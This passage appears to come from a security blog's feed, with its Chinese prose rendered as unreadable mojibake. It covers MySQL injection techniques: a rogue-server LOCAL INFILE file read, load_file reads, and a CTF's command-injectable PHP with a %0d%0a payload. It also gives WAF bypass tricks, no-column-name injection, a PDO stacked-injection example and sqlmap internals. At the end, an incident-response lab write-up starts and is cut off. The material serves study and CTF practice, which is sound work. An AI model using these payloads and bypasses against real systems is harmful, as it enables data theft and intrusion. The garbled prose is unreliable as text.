title="æ¡ä»¶"></a>æ¡ä»¶</h6><ul><li><p>å®¢æˆ·ç«¯å¿…é¡»å¯ç”¨LOCAL-INFILE </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿æ¥æ—¶å‚æ•°--local-infile=OFF å¯ä»¥ä¿®å¤ï¼Œæˆ–è€…æ›´æ”¹å…¨å±€å˜é‡local_infile(æˆ‘åœ¨5.7ä¸‹å‚æ•°å¯ä»¥ï¼Œæ›´æ”¹å…¨å±€å˜é‡ä¸è¡Œï¼Ÿï¼Ÿ)</span><br></pre></td></tr></table></figure></li><li><p>å®¢æˆ·ç«¯æ”¯æŒéSSLè¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿æ¥æ—¶å‚æ•°--ssl-mode=VERIFY_IDENTITY å¯ä»¥ä¿®å¤</span><br></pre></td></tr></table></figure></li><li><p>ç›®æ ‡webå­˜åœ¨è¿æ¥æ•°æ®åº“çš„åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ•°æ®åº“å¼±å£ä»¤æ‰«æï¼Œè¿æ¥æ£€æŸ¥</span><br><span class="line">ç½‘ç«™é‡è£…æ¼æ´ï¼ˆéœ€è¦è¿æ¥æ•°æ®åº“ï¼‰</span><br><span class="line">æ•°æ®è¿ç§»æœåŠ¡</span><br><span class="line">Excleä»æ•°æ®åº“ä¸­åŒæ­¥æ•°æ®åˆ°è¡¨æ ¼å†…</span><br></pre></td></tr></table></figure></li></ul><h6 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„mysqléƒ½æ˜¯5.7ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><p><code>mysql5.7</code>é»˜è®¤å¼€å¯</p><p><img src="/../images/image-20230523163445312.png" alt="image-20230523163445312"></p><p>æ³¨ï¼šä¸€å¼€å§‹ä½¿ç”¨æœåŠ¡ç«¯ä½¿ç”¨8ç‰ˆæœ¬ä¸è¡Œ</p><p>æ”»å‡»è€…ï¼ˆæœåŠ¡ç«¯ï¼‰èµ·è„šæœ¬</p><p><img src="/../images/image-20230523162503899.png" alt="image-20230523162503899"></p><p><img src="/../images/image-20230523162623757.png" alt="image-20230523162623757"></p><p>å—å®³è€…è¿æ¥</p><p><img src="/../images/image-20230523162534773.png" alt="image-20230523162534773"></p><p>æ”»å‡»è€…æŸ¥çœ‹<code>mysql.log</code></p><p><img src="/../images/image-20230523162727437.png" alt="image-20230523162727437"></p><h5 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a><code>load_file</code></h5><p><strong>æ³¨æ„ï¼šè½¬ä¹‰å­—ç¬¦</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;e:\test.txt&#x27;); # \t é”™è¯¯è·¯å¾„</span><br><span class="line">select load_file(&#x27;e:\\test.txt&#x27;);# æ­£ç¡®</span><br><span class="line">select load_file(0x653A5C746573742E747874);# æ”¯æŒåå…­è¿›åˆ¶</span><br><span class="line">select load_file(char(101,58,92,116,101,115,116,46,116,120,116));# æ”¯æŒcharå‡½æ•°</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134023401.png" alt="image-20230523134023401"></p><h5 id="load-data"><a href="#load-data" class="headerlink" title="load data "></a><code>load data </code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table user(cmd text)</span><br><span class="line">load data infile &#x27;e:/test.txt&#x27; into table user;</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134532606.png" alt="image-20230523134532606"></p><p><img src="/../images/image-20230522220456619.png" alt="image-20230522220456619"></p><h4 id="mysqldump"><a href="#mysqldump" class="headerlink" title="mysqldump"></a>mysqldump</h4><p><strong>shell</strong>ä¸‹æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases &gt; file_path  # å¯¼å‡ºæ‰€æœ‰æ•°æ®åº“</span><br><span class="line">mysqldump -uroot -proot --databases db1 --tables a1 a2  &gt; /file_path # å¯¼å‡ºdb1ä¸­çš„a1ã€a2è¡¨</span><br></pre></td></tr></table></figure><p>å¯¼å‡ºçš„æ–‡æœ¬å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ›å»ºæ•°æ®åº“åˆ¤æ–­è¯­å¥-åˆ é™¤è¡¨-åˆ›å»ºè¡¨-é”è¡¨-ç¦ç”¨ç´¢å¼•-æ’å…¥æ•°æ®-å¯ç”¨ç´¢å¼•-è§£é”è¡¨</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528204837541.png" alt="image-20230528204837541"></p><h5 id="ä¾‹é¢˜-3"><a href="#ä¾‹é¢˜-3" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><p>CISCN2023åˆèµ›â€“dumpit</p><p>å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;  <span class="comment">#é»‘åå•</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;db&#x27;</span>];</span><br><span class="line"><span class="variable">$t2d</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;table_2_dump&#x27;</span>];</span><br><span class="line"><span class="variable">$randstr</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>dbå’Œtableéƒ½å¯æ§ï¼Œè¿‡æ»¤ä¸ä¸¥è°¨ï¼Œå¹¶ä¸”ç›´æ¥æ‹¼æ¥åˆ°å‘½ä»¤ä¸­ï¼Œé€ æˆRCE</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=flag2 %0d%0a cmd</span><br></pre></td></tr></table></figure><h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>å›½å…‰å¸ˆå‚…âœçš„å¤ªå¥½è¾£ï¼Œç­‰åˆ°åé¢å­¦ä¹ windowsææƒå†å¤ç°å§ğŸ˜‹</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><h4 id="Linuxçš„Mysqlâ€“å¥½åƒæ²¡ç”¨"><a href="#Linuxçš„Mysqlâ€“å¥½åƒæ²¡ç”¨" class="headerlink" title="Linuxçš„Mysqlâ€“å¥½åƒæ²¡ç”¨"></a>Linuxçš„Mysqlâ€“å¥½åƒæ²¡ç”¨</h4><p><code>help</code>æŸ¥çœ‹<code>mysql</code>å¸®åŠ©</p><p><img src="/../images/image-20230522205545396.png" alt="image-20230522205545396"></p><p>å‡æƒ³ï¼šå¦‚æœå­˜åœ¨å †å æ³¨å…¥ï¼Œå°±å¯ä»¥ä»¥å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/image-20230522205812501.png" alt="image-20230522205812501"></p><p>æµ‹è¯•äº†ä¸€ä¸‹å¥½åƒä¸è¡Œ</p><p><img src="/../images/image-20230522223047561.png" alt="image-20230522223047561"></p><p><strong>å¹¶ä¸”æ­¤æ–¹æ³•åªèƒ½åœ¨æœ¬åœ°è¯»å–ï¼Œè¿œç¨‹è¿æ¥mysqlæ—¶ä½¿ç”¨systemï¼Œå®é™…ä¸Šè¿˜æ˜¯åœ¨åŸæ¥çš„ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ã€‚</strong></p><p><code>kali</code>è¿æ¥è¿œç¨‹mysqlï¼Œ<code>system uname -a</code></p><p><img src="/../images/image-20230522210207967.png" alt="image-20230522210207967"></p><h2 id="Mysqlç»•è¿‡è¡¥å……"><a href="#Mysqlç»•è¿‡è¡¥å……" class="headerlink" title="Mysqlç»•è¿‡è¡¥å……"></a>Mysqlç»•è¿‡è¡¥å……</h2><h3 id="é€šç”¨ç»•è¿‡"><a href="#é€šç”¨ç»•è¿‡" class="headerlink" title="é€šç”¨ç»•è¿‡"></a>é€šç”¨ç»•è¿‡</h3><ul><li><p>å¤§å°å†™ç»•è¿‡</p><p>ä¿®å¤ï¼šæ­£åˆ™<code>/i</code></p></li><li><p>åŒå†™ç»•è¿‡ï¼ˆwafå°†å…³é”®å­—æ›¿æ¢ä¸ºç©ºï¼Œä¸”æ¬¡æ•°ä¸º1ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uniunionon</span><br></pre></td></tr></table></figure><p>ä¿®å¤ï¼šæ­£åˆ™<code>/m</code></p></li></ul><h3 id="æ³¨é‡Šç¬¦ç»•è¿‡"><a href="#æ³¨é‡Šç¬¦ç»•è¿‡" class="headerlink" title="æ³¨é‡Šç¬¦ç»•è¿‡"></a>æ³¨é‡Šç¬¦ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ‰‹åŠ¨é—­åˆ</span><br><span class="line">$sql=&quot;select * from users where id=&#x27;$id&#x27;;&quot;</span><br><span class="line"></span><br><span class="line">$id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">select * from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;;</span><br></pre></td></tr></table></figure><h3 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h3><ul><li><p><code>%0a</code></p></li><li><p><code>%0d%0a</code></p></li><li><p><code>/**/</code></p></li><li><p>æ‹¬å·ç»•è¿‡</p><blockquote><p>åœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚è€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚</p></blockquote><p><img src="/../images/image-20230522161003063.png" alt="image-20230522161003063"></p></li></ul><h3 id="å¼•å·ç»•è¿‡"><a href="#å¼•å·ç»•è¿‡" class="headerlink" title="å¼•å·ç»•è¿‡"></a>å¼•å·ç»•è¿‡</h3><h4 id="ä¸è®©ç”¨å•å¼•å·"><a href="#ä¸è®©ç”¨å•å¼•å·" class="headerlink" title="ä¸è®©ç”¨å•å¼•å·"></a>ä¸è®©ç”¨å•å¼•å·</h4><p>å¯ä»¥ç”¨åå…­è¿›åˆ¶ä»£æ›¿</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where(table_name=&#x27;users&#x27;) â†’ where(table_name=0x7573657273)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522163358530.png" alt="image-20230522163358530"></p><h4 id="è½¬ä¹‰äº†å•å¼•å·"><a href="#è½¬ä¹‰äº†å•å¼•å·" class="headerlink" title="è½¬ä¹‰äº†å•å¼•å·"></a>è½¬ä¹‰äº†å•å¼•å·</h4><p>å®½å­—èŠ‚æ³¨å…¥ï¼ŒäºŒæ¬¡æ³¨å…¥</p><h3 id="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"><a href="#å­—ç¬¦ä¸²è¿æ¥å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"></a>å­—ç¬¦ä¸²è¿æ¥å‡½æ•°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">concat_ws(&quot;,&quot; , &quot;str1&quot; , &quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">group_concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br></pre></td></tr></table></figure><h3 id="selectç»•è¿‡"><a href="#selectç»•è¿‡" class="headerlink" title="selectç»•è¿‡"></a>selectç»•è¿‡</h3><ul><li><p>å·²çŸ¥è¡¨åå¯ä»¥ç”¨<code>handle</code></p></li><li><p>ç‰ˆæœ¬&gt;&#x3D;8.0</p><p><a href="https://blog.csdn.net/rfrder/article/details/118726022">mysql 8.0.21ä»¥ä¸Šç‰ˆæœ¬çš„æ–°ç‰¹æ€§</a></p></li><li><p>åœ¨å¯¹å½“å‰è¡¨çš„åˆ—åæ³¨å…¥æ—¶ï¼Œå¯ä»¥ç›´æ¥å†™å­—æ®µåï¼Œè€Œæ— éœ€<code>select è¯¥å­—æ®µ from è¯¥è¡¨</code></p><p><img src="/../images/image-20230522161753632.png" alt="image-20230522161753632"></p></li></ul><h3 id="é€—å·ç»•è¿‡"><a href="#é€—å·ç»•è¿‡" class="headerlink" title="é€—å·ç»•è¿‡"></a>é€—å·ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(databse(),1,1) ç­‰ä»·äº substr(databse() from 1 for 1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3; ç­‰ä»·äº select * from (select 1)a join (select 2)b join (select 3)c;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220718092241142.png" alt="image-20220718092241142"></p><h3 id="å†…è”æ³¨é‡Š"><a href="#å†…è”æ³¨é‡Š" class="headerlink" title="å†…è”æ³¨é‡Š"></a>å†…è”æ³¨é‡Š</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¦‚æœåŠ äº†!å°±ä¼šæ‰§è¡Œåœ¨/* */å†…çš„è¯­å¥</span><br><span class="line">/*!union select 1,2*/</span><br><span class="line"></span><br><span class="line"># è¦å°†æ•´ä¸ªè¯­å¥å†™å…¥/* */å†…</span><br><span class="line">/*!union select */1,2 è¿™æ˜¯é”™è¯¯çš„</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#  version 5.7.26</span><br><span class="line">/*!00000 select 1,2*/; å¯ä»¥</span><br><span class="line">/*!50726 select 1,2*/;  å¯ä»¥</span><br><span class="line">/*!50727 select 1,2*/;  ä¸å¯ä»¥</span><br><span class="line"></span><br><span class="line">00000 åˆ° 50726ä¹‹é—´æ˜¯å¯ä»¥çš„</span><br></pre></td></tr></table></figure><h3 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h3><h4 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h4><p><code>information_schem</code>è¢«è¿‡æ»¤ï¼Œä¸çŸ¥é“è¡¨çš„å­—æ®µå</p><h4 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h4><p>é€šè¿‡<code>select æ•°å­—</code>å°†å­—æ®µåè®¾ç½®ä¸ºæ•°å­—</p><p><img src="/../images/image-20230523141619236.png" alt="image-20230523141619236"></p><p>å†ç”¨è”åˆæŸ¥è¯¢å°†éœ€è¦çš„æ•°æ®å­˜åˆ°ä¸Šå›¾çš„è¡¨ä¸­</p><p><img src="/../images/image-20230523141701416.png" alt="image-20230523141701416"></p><p>é‚£ä¹ˆæƒ³è¦æŸ¥è¯¢<code>users</code>è¡¨ä¸­çš„<code>username</code>å­—æ®µçš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `2` from (select 1,2,3 union select * from user)åˆ«å;</span><br><span class="line"></span><br><span class="line"># åˆ«åæ˜¯(select 1,2 union select * from user)è¿”å›çš„è¡¨çš„åˆ«å</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523141936080.png" alt="image-20230523141936080"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¦‚æœåå¼•å·è¢«è¿‡æ»¤</span><br><span class="line">select group_concat(b) from (select 1,2 as b,3 union select * from users)a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523142119240.png" alt="image-20230523142119240"></p><h2 id="é¢„ç¼–è¯‘é—®é¢˜"><a href="#é¢„ç¼–è¯‘é—®é¢˜" class="headerlink" title="é¢„ç¼–è¯‘é—®é¢˜"></a>é¢„ç¼–è¯‘é—®é¢˜</h2><p>æ¨èé˜…è¯»ï¼š</p><p><a href="https://forum.butian.net/share/1559">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-SQLæ³¨å…¥&amp;é¢„ç¼–è¯‘</a></p><p><a href="https://xz.aliyun.com/t/3950">PDOåœºæ™¯ä¸‹çš„SQLæ³¨å…¥æ¢ç©¶ - å…ˆçŸ¥ç¤¾åŒº</a></p><h3 id="é¢„ç¼–è¯‘å¤±æ•ˆ"><a href="#é¢„ç¼–è¯‘å¤±æ•ˆ" class="headerlink" title="é¢„ç¼–è¯‘å¤±æ•ˆ"></a>é¢„ç¼–è¯‘å¤±æ•ˆ</h3><p><code>PHP-PDO</code>é‡‡ç”¨æœ¬åœ°é¢„å¤„ç†</p><p><img src="/../images/image-20230330172825283.png" alt="image-20230330172825283"></p><p>ä¼ å…¥<code>?username=&#39;admin&#39;</code>,æŸ¥çœ‹æ—¥å¿—å¦‚ä¸‹</p><blockquote><p>å¼€å¯æ°¸ä¹…æ—¥å¿—,åœ¨é…ç½®æ–‡ä»¶ä¸­åŠ å…¥</p><p>general_log &#x3D; 1<br>general_log_file &#x3D; æ—¥å¿—è·¯å¾„</p></blockquote><p><img src="/../images/image-20230330172741664.png" alt="image-20230330172741664"></p><p>å¯ä»¥çœ‹åˆ°é¢„ç¼–è¯‘ä¸ºå…¶è‡ªåŠ¨æ·»åŠ äº†ä¸€å¯¹å¼•å·ï¼Œå¹¶å°†ç”¨æˆ·è¾“å…¥çš„å¼•å·è¿›è¡Œè½¬ä¹‰ã€‚</p><p>é‚£ä¹ˆå¦‚æœå°†è¡¨åï¼Œ<code>order by xx</code>å¤„è¿›è¡Œé¢„ç¼–è¯‘å°±ä¼šäº§ç”Ÿå¦‚ä¸‹æ•ˆæœ</p><p><img src="/../images/image-20230330001720031.png" alt="image-20230330001720031"></p><p><img src="/../images/image-20230330001733787.png" alt="image-20230330001733787"></p><p>å¯ä»¥çœ‹åˆ°è¿™äº›è¯­å¥â€å¤±æ•ˆäº†â€ï¼ˆæ²¡æœ‰å¾—åˆ°æƒ³è¦çš„ç»“æœï¼‰ï¼Œæ‰€ä»¥åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¯¹äºè¿™äº›è¯­å¥å¤§æ¦‚ç‡å°±æ˜¯è¿›è¡Œä¸€ä¸ªæ‹¼æ¥å¤„ç†ï¼Œå°±å¾ˆå¯èƒ½å­˜åœ¨sqlæ³¨å…¥ã€‚</p><h3 id="é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯"><a href="#é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯" class="headerlink" title="é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯"></a>é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯</h3><ul><li><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">ThinkPHP5 SQLæ³¨å…¥æ¼æ´ &amp;&amp; PDOçœŸ&#x2F;ä¼ªé¢„å¤„ç†åˆ†æ | ç¦»åˆ«æ­Œ</a></p></li><li><p>å †å æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment"># é¢„å¤„ç†è¯­å¥</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from users where id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$fraction</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$fraction</span>);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ¨¡æ‹Ÿé¢„ç¼–è¯‘ï¼Œå¹¶ä¸”æ²¡æœ‰ç»‘å®šå‚æ•°</p><p>åˆå› ä¸ºPDOé»˜è®¤å¯ä»¥æ”¯æŒå¤šæ¡SQLæ‰§è¡Œï¼Œæ‰€æœ‰é€ æˆäº†å †å æ³¨å…¥ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;create database pdo;</span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20230523131701820.png" alt="image-20230523131701820"></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmap æºç åˆ†æ</p><p>![img](E:\typora img\routine.png)</p><ul><li><p><a href="https://www.anquanke.com/post/id/262848">sqlmap é¡¹ç›®å‰–æ1</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262847">sqlmap é¡¹ç›®å‰–æ2</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262849">sqlmap é¡¹ç›®å‰–æ3</a></p><p>sqlmap ä½¿ç”¨ä¸€ç§æå…¶å·§å¦™çš„æ–¹å¼ç»„åˆç”Ÿæˆä¸€ä¸ªå®Œæ•´çš„ payloadï¼Œä¸€ä¸ªå®Œæ•´çš„ payload ç”±å¦‚ä¸‹å‡ ä¸ªéƒ¨åˆ†ç»„æˆï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">prefix</span>&gt;</span> <span class="tag">&lt;<span class="name">test</span>&gt;</span> <span class="tag">&lt;<span class="name">comment</span>&gt;</span> <span class="tag">&lt;<span class="name">suffix</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ prefixã€commentã€suffix ä½œä¸º boundaryï¼Œboundary ç”¨äºé—­åˆæ³¨å…¥ç‚¹çš„å‰åéƒ¨åˆ†ï¼›test åˆ™æ˜¯æœ€ç»ˆå¦‚æœé—­åˆæˆåŠŸåå¿…ç„¶æ‰§è¡Œçš„è¯­å¥ã€‚</p><p>å› æ­¤ sqlmap å°† prefix ä¸ suffix å•ç‹¬ä½œä¸º boundaries ä¿å­˜ï¼Œè€Œ test å’Œ comment åˆ™æ ¹æ®æ³¨å…¥æ–¹å¼å’Œæ•°æ®åº“çš„ä¸åŒè¢«åˆ’åˆ†ä¸ºå…­ä¸ªæ–‡ä»¶ï¼ˆè·¯å¾„ï¼š<code>/data/xml/payloads</code>ï¼‰</p><p>![img](E:\typora img\t01d7dbc46705981404.jpg)</p></li><li><p><a href="https://www.anquanke.com/post/id/262850">sqlmap é¡¹ç›®å‰–æ4</a></p><p>å¸ƒå°”æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…ˆå‘é€ä¸€ä¸ª false è¯·æ±‚ï¼Œå¦‚æœç»“æœä¸åŸé¡µé¢ç›¸åŒå°±åˆ¤æ–­ä¸å­˜åœ¨å¸ƒå°”æ³¨å…¥</span><br><span class="line">å¦‚æœä¸ç›¸åŒå‘é€ä¸€ä¸ª true è¯·æ±‚,å¦‚æœä¸åŸé¡µé¢ç›¸ä¼¼</span><br><span class="line">åˆ™å†å‘é€ä¸€ä¸ª false è¯·æ±‚ï¼Œç„¶åæŠŠè¿™ä¸¤æ¬¡è¿”å›çš„ç»“æœå–å·®é›†ï¼Œè®¡ç®—å‡ºTrueæ—¶çš„flagæ ‡è¯†ï¼Œä¹Ÿå°±æ˜¯sqlmapçš„-stringå‚æ•°</span><br></pre></td></tr></table></figure><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘é€æŠ¥é”™payloadï¼Œå¦‚æœèƒ½å¤Ÿæ­£åˆ™åŒ¹é…åˆ°åˆ™è¯´æ˜å­˜åœ¨æŠ¥é”™æ³¨å…¥ã€‚</span><br></pre></td></tr></table></figure><p>å»¶æ—¶æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…ˆå‘é€Nä¸ªæ­£å¸¸è¯·æ±‚ï¼Œç„¶åè®¡ç®—è¿™Nä¸ªè¯·æ±‚å“åº”æ—¶é—´çš„æ ‡å‡†å·®å’Œæ­£å¸¸è¯·æ±‚çš„æœ€é•¿å“åº”æ—¶é—´</span><br><span class="line">ç„¶åå‘é€ä¸€ä¸ªå»¶æ—¶è¯·æ±‚ï¼Œåˆ¤æ–­æ˜¯å¦åœ¨åŒºé—´å†…</span><br></pre></td></tr></table></figure><p>è”åˆæŸ¥è¯¢æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨order byå’ŒäºŒåˆ†æ³•æ¥åˆ¤æ–­åˆ—æ•°</span><br><span class="line">éå†åˆ—æ•°åˆ¤æ–­å“ªä¸€åˆ—æ˜¯å›æ˜¾ç‚¹</span><br><span class="line">å‘é€payload</span><br></pre></td></tr></table></figure></li><li><p><a href="https://www.beysec.com/security/sqlmap-source-1.html">sqlmapæºç åˆ†æä¸å­¦ä¹ </a></p></li><li><p><a href="https://www.processon.com/view/5835511ce4b0620292bd7285">sqlmap æµç¨‹è„‘å›¾</a></p></li></ul><p>os-shell åŸç†</p><ul><li><a href="https://xz.aliyun.com/t/7942">sqlmap â€“os-shellåŸç†</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&mid=2247485339&idx=1&sn=ea76ee0d56b8a95a118a60d111d48160">Sqlmapä¹‹os-shellåŸç†åˆ†æ</a></li></ul><p>æ”»é˜²</p><ul><li><a href="https://xz.aliyun.com/t/10385">å®æˆ˜sqlmapç»•è¿‡WAF</a></li><li><a href="https://www.anquanke.com/post/id/261915">sqlmap â€“os-shellååˆ¶å°æ€è·¯</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247494179&idx=1&sn=e6c94b87981fda009e7be50c9eb73bf6">å…¥ä¾µæ£€æµ‹ä¹‹sqlmapæ¶æ„æµé‡åˆ†æ</a></li></ul><h2 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h2><ul><li><p>æ­£ç¡®ä½¿ç”¨é¢„ç¼–è¯‘+é»‘åå•</p></li><li><p>é…ç½®é—®é¢˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  ç«™åº“åˆ†ç¦»</span><br><span class="line">  ä¸å…è®¸å¤–è¿</span><br><span class="line">  æ•°æ®åº“ä»¥ä½æƒé™è¿è¡Œ</span><br><span class="line">  ä¸æ˜¾ç¤ºæŠ¥é”™</span><br><span class="line">  ä¸ä½¿ç”¨å¤šè¯­å¥æŸ¥è¯¢</span><br><span class="line">  secure_file_priv=NULL</span><br><span class="line">å­—ç¬¦é›†ä¿æŒä¸€è‡´</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bugku åº”æ€¥å“åº”</title>
      <link href="/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h3 id="jsåŠ«æŒ"><a href="#jsåŠ«æŒ" class="headerlink" title="jsåŠ«æŒ"></a>jsåŠ«æŒ</h3><p><img src="/../images/image-20230402174621652-1686151030355.png" alt="image-20230402174621652"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `find /var/www/html -name &quot;6127418cad73c.php&quot;`</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230402174633296-1686151030358.png" alt="image-20230402174633296"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . | xargs grep -ri &#x27;&lt;script type=&quot;text/javascript&quot;&gt;&#x27; -l | sort | uniq -c</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€šè¿‡xssçš„ç‰¹å¾å†…å®¹æ¥å®šä½å¯ç–‘æ–‡ä»¶</p><h3 id="åå¼¹shellåé—¨"><a href="#åå¼¹shellåé—¨" class="headerlink" title="åå¼¹shellåé—¨"></a>åå¼¹shellåé—¨</h3><p><img src="/../images/image-20230402180138838-1686151030359.png" alt="image-20230402180138838"></p><p><img src="/../images/image-20230402180201438-1686151030359.png" alt="image-20230402180201438"></p><p>å¤„ç†ï¼š</p><p>åˆ 